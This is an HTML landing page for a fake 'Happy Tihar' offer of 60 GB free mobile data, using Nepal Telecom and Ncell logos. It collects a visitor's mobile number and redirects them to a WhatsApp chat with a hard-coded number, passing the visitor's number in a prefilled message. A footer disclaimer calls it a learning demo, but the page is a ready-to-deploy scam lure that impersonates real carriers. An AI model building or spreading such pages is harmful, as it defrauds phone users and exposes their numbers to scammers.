<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Happy Tihar – 60 GB Free Data</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(180deg, #ff6600 0%, #ffcc66 100%);
    color: #fff;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .container {
    background: #fff;
    color: #333;
    max-width: 420px;
    width: 90%;
    border-radius: 18px;
    box-shadow: 0 8px 25px rgba(0,0,0,0.2);
    overflow: hidden;
    text-align: center;
  }
  .banner img {
    width: 100%;
    display: block;
  }
  .content {
    padding: 1.5rem;
  }
  .content h1 {
    font-size: 1.8rem;
    color: #ff6600;
    margin-bottom: 0.5rem;
  }
  .content h2 {
    font-size: 2.6rem;
    color: #d43f00;
    margin-bottom: 0.2rem;
  }
  .content p {
    color: #555;
    margin-bottom: 1.5rem;
  }
  .providers {
    display: flex;
    justify-content: space-evenly;
    margin-bottom: 1.5rem;
  }
  .providers img {
    height: 38px;
    object-fit: contain;
  }
  input[type="tel"] {
    width: 100%;
    padding: 12px 15px;
    font-size: 1rem;
    border: 2px solid #ff6600;
    border-radius: 10px;
    outline: none;
    margin-bottom: 1rem;
  }
  button {
    width: 100%;
    padding: 12px;
    font-size: 1.1rem;
    border: none;
    border-radius: 10px;
    background: #ff6600;
    color: #fff;
    cursor: pointer;
    transition: 0.25s;
  }
  button:hover {
    background: #e65c00;
  }
  footer {
    font-size: 0.8rem;
    color: #888;
    margin-top: 1.5rem;
  }
</style>
</head>
<body>
  <div class="container">
    <div class="banner">
      <img src="https://i.imgur.com/0LfE7zJ.jpg" alt="Happy Tihar 60GB Free Data Banner">
    </div>
    <div class="content">
      <h1>Happy Tihar Offer</h1>
      <h2>60 GB Free Data</h2>
      <p>Available for all NTC &amp; Ncell users. Enter your number below to continue.</p>

      <div class="providers">
        <img src="https://upload.wikimedia.org/wikipedia/en/4/4f/Nepal_Telecom_logo.png" alt="NTC Logo">
        <img src="https://upload.wikimedia.org/wikipedia/en/c/c1/Ncell_logo.svg" alt="Ncell Logo">
      </div>

      <form id="claimForm">
        <input type="tel" id="phone" placeholder="Enter your mobile number" pattern="[0-9]{10}" required />
        <button type="submit">Claim Now</button>
      </form>

      <footer>Demo page for learning purpose – not an official offer.</footer>
    </div>
  </div>

<script>
  document.getElementById('claimForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const num = document.getElementById('phone').value.trim();
    if(num.length >= 9) {
      const msg = encodeURIComponent(`Hello! I want to claim 60 GB free data. My number is ${num}`);
      window.location.href = `https://wa.me/9779766666187?text=${msg}`;
    } else {
      alert('Please enter a valid mobile number.');
    }
  });
</script>
</body>
</html></html>
